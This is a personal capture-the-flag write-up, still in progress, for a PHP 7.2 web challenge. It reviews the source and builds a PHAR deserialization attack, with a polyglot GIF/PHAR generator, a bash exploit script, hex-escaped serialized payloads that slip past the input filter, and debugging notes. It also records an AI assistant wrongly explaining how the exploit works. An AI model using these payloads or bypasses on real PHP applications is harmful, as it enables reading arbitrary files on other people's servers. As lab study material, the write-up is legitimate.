---
tags:
  - 🚩
up:
  - "[[02 - (incomplete) Data Exfiltration]]"
platform: BKSEC TTV
difficulty: Hard
creation_date: 2026-03-07
last_modified: 2026-03-07
---

# 🚩 [[BKSEC - Ancient Scroll]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - (incomplete) Data Exfiltration]]

**Related Techniques:** [[(incomplete) PHP Object Injection]], [[(incomplete) PHP Archive Deserialization]]

## Executive Summary
* **OS:** Linux
* **Status:** `In Progress`

---

## White Box Enumeration
### Dockerfile
```dockerfile
FROM php:7.2-apache

WORKDIR /var/www/html

COPY src/ /var/www/html/

COPY php-src/libphp7_amd64.so /tmp/libphp7_amd64.so
COPY php-src/libphp7_arm64.so /tmp/libphp7_arm64.so

RUN ARCH=$(dpkg --print-architecture) && \
    if [ "$ARCH" = "amd64" ]; then \
        mv /tmp/libphp7_amd64.so /usr/lib/apache2/modules/libphp7.so; \
    elif [ "$ARCH" = "arm64" ]; then \
        mv /tmp/libphp7_arm64.so /usr/lib/apache2/modules/libphp7.so; \
    else \
        echo "Unsupported architecture: $ARCH"; exit 1; \
    fi && \
    rm /tmp/libphp7_*.so

RUN echo "BKSEC{REDACTED}" > /flag.txt
RUN chown -R www-data:www-data /var/www/html && chmod -R 755 /var/www/html
```
I immediately notice that the flag is located at `/flag.txt` and the PHP version is 7.2.

### docker-compose.yml
```yaml
version: "3.8"

services:
  web:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: ancient_scroll
    ports:
      - "8888:80"
```
Nothing significant about this docker compose file.

### config.php
```php
<?php
session_start();

define('APP_NAME', 'Sacred Temple');
define('APP_VERSION', '1.0');
function isLoggedIn()
{
    return isset($_SESSION['user']) && !empty($_SESSION['user']);
}

function requireLogin()
{
    if (!isLoggedIn()) {
        header('Location: login.php');
        exit;
    }
}

function getCurrentUser()
{
    return $_SESSION['user'] ?? null;
}
```
The config file defined some simple function, does not look exploitable nor it has any hard-coded credentials.

### login.php
```php
<?php
require_once 'config.php';

if (isLoggedIn()) {
    header('Location: index.php');
    exit;
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');

    if (empty($username)) {
        $error = 'You must declare your name to the Temple Guard.';
    } else {
        $_SESSION['user'] = $username;
        $_SESSION['login_time'] = time();
        header('Location: index.php');
        exit;
    }
}

$isBanishment = false;

if (isset($_GET['error']) && $_GET['error'] === 'banished') {
    $error = "You have been banished from the temple for tampering with the sacred seals!";
    $isBanishment = true;
}

include 'includes/header.php';
?>

<h2 class="page-title">☸ Enter the Temple ☸</h2>

<p class="ancient-text">"State your name, traveler, and the path shall open."</p>

<div class="ornament">❧ ❧ ❧</div>

<?php if ($error): ?>
    <div class="message <?= $isBanishment ? 'message-banish' : 'message-error' ?>">
        <?= $isBanishment ? '☠ ' : '' ?>
        <?= htmlspecialchars($error) ?>
    </div>
<?php endif; ?>

<form method="POST" class="ancient-form">
    <div class="form-group">
        <label for="username">Your Name</label>
        <input type="text" id="username" name="username" value="<?= htmlspecialchars($_POST['username'] ?? '') ?>"
            required autocomplete="username" placeholder="e.g. Seeker">
    </div>

    <button type="submit" class="btn btn-block">Enter Name</button>
</form>

<div class="ornament">❧ ❧ ❧</div>

<div class="scroll-card text-center" style="margin-top: 30px;">
    <h3>⚱ Temple Register</h3>
    <p>The gates are open to all who seek wisdom. Simply inscribe your name to enter the archives.</p>
</div>

<?php include 'includes/footer.php'; ?>
```
The `login.php` takes one parameter is the username that the user set and nothing else to create a user session. So far not sure how will this be use for exploit. Let's look for more information.

### upload.php
A very suspicious upload file, if it appears here there might be some file upload vulnerabilities?

```php
<?php
require_once 'config.php';
requireLogin();

$message = '';
$uploadedFile = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
    $file = $_FILES['avatar'];
    $uploadDir = 'assets/uploads/';

    if (!file_exists($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    $isImage = getimagesize($file['tmp_name']);
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    $fileType = mime_content_type($file['tmp_name']);

    if ($isImage !== false && in_array($fileType, $allowedTypes)) {
        if ($isImage[0] > 5000 || $isImage[1] > 5000) {
            $message = "The spirits reject vessels that are too large.";
        } else {
            $filename = md5(uniqid() . $file['name']) . '.jpg';
            $targetPath = $uploadDir . $filename;

            if (move_uploaded_file($file['tmp_name'], $targetPath)) {
                $message = "Avatar uploaded successfully!";
                $uploadedFile = $targetPath;
            } else {
                $message = "Failed to move uploaded file.";
            }
        }
    } else {
        $message = "Invalid image file. The spirits reject this offering.";
    }
}

include 'includes/header.php';
?>
[...]
```
It is an avatar upload function that takes a file in and check whether it is an image, however the filter seemed flawed with the appearance of `getimagesize()` and `mime_content_type()` which only check for the signature of the image, which I may be able to bypass with a polyglot, but we'll see. The image is then stored inside the `assets/uploads` folder and the path to the image will then be reflected.

### scroll.php
```php
<?php
require_once 'config.php';
require_once 'includes/validator.php';
require_once 'includes/divine.php';
requireLogin();

class Scroll
{
    public $path;

    public function __construct($path = null)
    {
        $this->path = $path;
    }

    public function __toString()
    {
        if (empty($this->path)) {
            return "This scroll has no path.";
        }

        try {
            if (file_exists($this->path)) {
                return "The scroll exists in this realm.";
            }
        } catch (Exception $e) {
            return $e->getMessage();
        }

        return "The scroll cannot be found.";
    }
}

$result = null;
$error = null;

$default_seal = serialize(new Scroll("includes/header.php"));

$input_seal = $_GET['seal'] ?? $default_seal;

if (!empty($input_seal)) {
    if (!isset($_SESSION['attempts'])) {
        $_SESSION['attempts'] = 0;
    }

    $validatedSeal = validateSeal($input_seal);

    $isFailure = false;

    if ($validatedSeal === false) {
        $error = "The spirits rejected your offering.";
        $isFailure = true;
    } else {
        try {
            $scroll = @unserialize($validatedSeal);

            if ($scroll === false) {
                $error = "The seal is broken.";
                $isFailure = true;
            } else {
                $result = "Oracle says: " . $scroll;
            }
        } catch (Exception $e) {
            $error = "The ritual failed.";
            $isFailure = true;
        }
    }

    if ($isFailure) {
        $_SESSION['attempts']++;
        if ($_SESSION['attempts'] >= 5) {
            session_destroy();
            header("Location: login.php?error=banished");
            exit;
        }
    }
}

include 'includes/header.php';
?>
```
This is quite interesting, the file define a class called `Scroll` that has an attribute called `path`. When being concatenated later with the "Oracle says:", the `__toString()` method is called and the existence of the `path` is checked.

Below is the logic related to how the logic is implement, the `scroll.php` endpoint takes the user input from the `seal` parameter and pass it through various filters before deserialize it and assign it to a `Scroll` object. So... the seal is a PHP object? so maybe this challenge is an PHP object injection. 

Let's check the validating logic.

### includes/validator.php
```php
<?php
function validateSeal($input)
{
    $input = str_replace('.', '', $input);
    $input = str_replace('/', '', $input);

    if (strpos($input, 'O:6:') !== false) {
        return false;
    }
    if (stripos($input, 'flag') !== false) {
        return false;
    }
    if (stripos($input, 'DivineKnowledge') !== false) {
        return false;
    }

    return $input;
}

```
The validator takes in the input and trips it of `.` and `/` so to prevent the input being a path.... which is a bit weird since the `Scroll` object that later takes the input as a "path" to check for its existence.

It also forbid the input to contain the string `O:6:` which is the same exact length of `Scroll`. It cannot have the word `flag` and the word `DivineKnowledge`.

I asked Gemini about possible obfuscation I may be able to use in order to bypass this filter

![[Pasted image 20260307202238.png#center]]

As for the `.` and `/` we can bypass with obfuscation, since `unserialize` method allow hex encoding by setting the string type to `S` instead of  `s`. Similarly we can use the same trick to bypass the `flag` and the `DivineKnowledge` filter.

As for the `0:6:`, it is targeting the `Scroll` object specifically, I might either use another class that has different length or add the `+` or a space (`0: 6`) to bypass this

### includes/divine.php
```php
<?php
class DivineKnowledge
{
    public $scroll_path;

    public function __construct($path)
    {
        $this->scroll_path = $path;
    }

    public function __wakeup()
    {
        throw new Exception("Divine Revelation: " . file_get_contents($this->scroll_path));
    }
    // Do you think you are divine's exception?
    // public function __toString()
    // {
    //     return file_get_contents($this->scroll_path);
    // }
}
```

So now I know that `DivineKnowledge` is a class. It has a `__wakeup()` function which is called when it is deserialized, and throw the exception what contains the file contents.

This fits perfectly with the previous `scroll.php` and the `validator.php` file, if I input a `DivineKnowledge`object instead of a `Scroll` object, I can bypass the filters with obfuscation, when the object is deserialized, it will throw an error and the `scroll.php` should catch it and display the content of the flag at the root folder that I put into the `scroll_path` field.

But when I asked Gemini again, it suggested a different way. In my previous logic, the error was thrown, but the `try catch` block in the`scroll.php` file does not handle exception by printing out the error. Instead of that it suggested me to inject the `DivineKnowledge` object to a polyglot and upload it to the system using the `upload.php`, then input a `Scroll` object whose `path` point to the polyglot. Then when the object is deserialized, so is the injected `DivineKnowledge` object.

![[Pasted image 20260307204612.png]]

However, this is the time where the AI is hallucinated as it is thinking the if the `Scroll` is deserialized then the object at the path the `Scroll` is pointing to is also deserialized. 

I tells the AI to forge me a bash files to test its theory:

![[Pasted image 20260307210707.png]]

```bash
#!/bin/bash

TARGET="http://localhost:8888"
COOKIE="temple_cookie.txt"

echo "=========================================="
echo "🏺 1. Forging the Polyglot Relic (relic.gif)"
echo "=========================================="
# We create a GIF-headered file containing the serialized DivineKnowledge object
php -r '
    class DivineKnowledge { 
        public $scroll_path = "/flag.txt"; 
    }
    $payload = serialize(new DivineKnowledge());
    // GIF89a magic bytes: 47 49 46 38 39 61
    $image = "GIF89a\x01\x00\x01\x00\x00" . $payload;
    file_put_contents("relic.gif", $image);
'
echo "[+] Relic created."

echo "=========================================="
echo "🚶 2. Authenticating & Uploading"
echo "=========================================="
# Login to get a valid session
curl -s -c $COOKIE -d "username=Haiyahhh" "$TARGET/login.php" > /dev/null

# Upload the polyglot and extract the returned path
UPLOAD_RES=$(curl -s -b $COOKIE -F "avatar=@relic.gif" "$TARGET/upload.php")
FILE_PATH=$(echo "$UPLOAD_RES" | grep -oP '(?<=<code>).*?(?=</code>)')

if [ -z "$FILE_PATH" ]; then
    echo "[!] Upload failed. Check server status."
    exit 1
fi
echo "[+] Relic stored at: $FILE_PATH"

echo "=========================================="
echo "📜 3. Triggering the Revelation"
echo "=========================================="
# We bypass validator.php by using O:+15 and S: hex-encoding
# This injects the object directly into unserialize() in scroll.php
PAYLOAD=$(php -r "
    \$path = '/flag.txt'; 
    \$hex_path = str_replace(['/', '.'], ['\\2f', '\\2e'], \$path);
    echo 'O:15:\"\44ivineKnowledge\":1:{s:11:\"scroll_path\";S:9:\"' . \$hex_path . '\";}';
")

echo "[*] Sending Payload: $PAYLOAD"

# The DivineKnowledge::__wakeup() throws an exception with the flag
# scroll.php catches this and displays it
RESULT=$(curl -s -b $COOKIE -G --data-urlencode "seal=$PAYLOAD" "$TARGET/scroll.php")

echo "------------------------------------------"
echo "✨ ORACLE REVELATION:"
echo "$RESULT" | grep -oP '(?<=⚠ ).*?(?= </div>)' || echo "$RESULT" | grep "Divine Revelation"
echo "------------------------------------------"

rm relic.gif
```

The output:
```bash
#
==========================================
🏺 1. Forging the Polyglot Relic (relic.gif)
==========================================
[+] Relic created.
==========================================
🚶 2. Authenticating & Uploading
==========================================
[+] Relic stored at: assets/uploads/63264b53d0599ae18280e25f623075ed.jpg
==========================================
📜 3. Triggering the Revelation
==========================================
[*] Sending Payload: O:15:"\44ivineKnowledge":1:{s:11:"scroll_path";S:9:"\2fflag\2etxt";}
------------------------------------------
✨ ORACLE REVELATION:
The spirits rejected your offering.       
------------------------------------------
```

This means the output could not pass the validator, after testing, it is revealed that the name of the object cannot be obfuscated. 
    

## PHP Archive Deserialization

Despite introducing rabbit hole. The solution it propose is actually quite elegant if it can be pulled off since it utilize all of the found vulnerabilities. There must be another way.

![[Pasted image 20260307211744.png]]

There is something called **PHAR deserialization**, I got a little suspicious about this so I google the term myself and got through this [blog](https://www.sonarsource.com/blog/new-php-exploitation-technique/) 

At the end of the blog is something quite intriguing:

![[Pasted image 20260307212135.png#center]]

Further research even give me that this vulnerability is not default in PHP 8 anymore but PHP 7 (which is the one the challenge uses) is still vulnerable. This is definitely not a coincidence from the author.

The blog mentioned that I need a file upload vulnerability for the attack to work, which I have, and have a way to trigger the vulnerability through the `file_exists()` method inside the `Scroll` object.

So the attack vector will be like this: 
- Upload a PHP archive whose metadata is the `DivineKnowlede` object that has the `scroll_path` set to the `/flag.txt`, as a polyglot to the server.
- Input the seal which is a `Scroll` object to the `scroll.php`. The `Scroll` object is obfuscated as `0:06:O:06:"Scroll":1:{s:4:"path";S:81:"phar:\2f\2f\2fpath\2fto\2fthe\2fpolyglot\2ejpg\2ftest\2etxt";}`

The code I got after some hours of debugging:

```php
<?php
// forge_polyglot.php

@unlink('polyglot.phar');
@unlink('polyglot.gif');

class DivineKnowledge
{
    public $scroll_path;

    public function __construct($path)
    {
        $this->scroll_path = $path;
    }

    public function __wakeup()
    {
        die("DEBUG - GADGET TRIGGERED! Reading path: " . $this->scroll_path . " Content: " . file_get_contents($this->scroll_path));
        throw new Exception("Divine Revelation: " . file_get_contents($this->scroll_path));
    }
    // Do you think you are divine's exception?
    // public function __toString()
    // {
    //     return file_get_contents($this->scroll_path);
    // }
}

try {
    $phar = new Phar('polyglot.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'This is just a dummy file.');
    $phar->setStub("GIF89a\x01\x00\x01\x00\x00" . "<?php __HALT_COMPILER(); ?>");

    $object = new DivineKnowledge("/flag.txt");
    $phar->setMetadata($object); 
    $phar->stopBuffering();

    rename('polyglot.phar', 'polyglot.gif');
    echo "[+] Success: 'polyglot.gif' has been forged!\n";

} catch (Exception $e) {
    echo "[-] Error forging PHAR: " . $e->getMessage() . "\n";
}
?>
```

```bash
#!/bin/bash

# exploit.sh

HOST="http://localhost:8888"
# HOST="http://hoang-dm2416798-ancient-scroll-3b584ebc.ttv.bksec.vn"
COOKIE="temple_cookie.txt"
USERNAME="user_$(uuidgen)"
echo $USERNAME

curl -i -s -c temple_cookie.txt -d "username=$USERNAME" "$HOST/login.php"

php forge_polyglot.php

curl -s -c $COOKIE -d "username=$USERNAME" "$HOST/login.php" > /dev/null

UPLOAD_RES=$(curl -s -b $COOKIE -F "avatar=@polyglot.gif" "$HOST/upload.php")
# echo "$UPLOAD_RES"

FILE_PATH=$(echo "$UPLOAD_RES" | grep -oP '(?<=<code>).*?(?=</code>)')

if [ -z "$FILE_PATH" ]; then
    echo "[!] Upload failed. Check connection."
    exit 1
fi
echo "[+] Relic stored safely at: $FILE_PATH"

RAW_PATH="phar:///var/www/html/${FILE_PATH}/test.txt"
LEN=${#RAW_PATH}

ENCODED_PATH="${RAW_PATH//\//\\2f}"
ENCODED_PATH="${ENCODED_PATH//./\\2e}"

PAYLOAD="O:06:\"Scroll\":1:{s:4:\"path\";S:${LEN}:\"${ENCODED_PATH}\";}"

echo "[+] The Payload: $PAYLOAD"
curl -s -b $COOKIE -G --data-urlencode "seal=$PAYLOAD" "$HOST/scroll.php" 
    
```

However, the attack failed successfully.

![[Pasted image 20260307214520.png#center]]

I then rigorously adding `echo` commands throughout the installed codebase and run the container again on the local.

![[Pasted image 20260307214936.png#center]]

![[Pasted image 20260307214955.png#center]]

![[Pasted image 20260307215045.png]]

It turned out that the payload died inside the deserialization of the `Scroll` object, right before the `if(file_exists($this->path))`. 

For the attack to work, `file_exists($this->path)` must return **True**, but here it returns false. However, when I tried `file_exists()` with the `phar://` wrappet on the docker container, it returned true.

![[Pasted image 20260307220001.png]]

I tried it again but this time I used a php file and modify it so that it can simulate what happen inside the `Scroll` object:

```php
<?php
require_once 'includes/divine.php';
class Scroll
{
    public $path;
    public function __construct($path = null) { $this->path = $path; }
    public function __toString()
    {
        try {
            echo $this->path . PHP_EOL;
            echo file_exists($this->path) . PHP_EOL;
            if (file_exists($this->path)) {
                return "The scroll exists in this realm.";
            }
        } catch (Exception $e) {
            return $e->getMessage();
        }
        return "The scroll cannot be found.";
    }
}

// the hardcoded payload that I got from previous runs of exploit.sh
$payload = 'O:06:"Scroll":1:{s:4:"path";S:81:"phar:\2f\2f\2fvar\2fwww\2fhtml\2fassets\2fuploads\2f7b537703b1897da3dcf68607dd0e956c\2ejpg\2ftest\2etxt";}';

echo "--- Unserialize Test ---\n";

$obj = @unserialize($payload);

try {
    echo "DEBUG - Attempting to unserialize: " . $payload . PHP_EOL;
    $scroll = unserialize($payload);

    if ($scroll === false) {
        $error = "The seal is broken.";
        $isFailure = true;
        echo $error;
    } else {
        $result = "Oracle says: " . $scroll;
        echo $result;
    }
} catch (Exception $e) {
    $error = "The ritual failed." . $e->getMessage();
    $isFailure = true;
    echo $error;
}
```

![[Pasted image 20260307220417.png]]

The result is surprising, even though the `echo file_exists($this->path) . PHP_EOL;` printed nothing, meaning `file_exists($this->path)` returned **False**, the flag was still printed, meaning the `file_exists($this->path)`'s value does not affect the output as I expected.

Checking around for some more time and it turned out **Dockerfile** is the culprit, or more specifically the imported PHP library inside it.

When I comment out all of the imported lib and run `exploit.sh`:

![[Pasted image 20260307221836.png#center]]

![[Pasted image 20260307221821.png#center]]

The attack worked. This leads to a much bigger problem is about looking at the code of the library with `Ghidra` to understand what it does and what should I do, or may be even change the whole attack vector.

---

## Loot & Flags

**Flag**: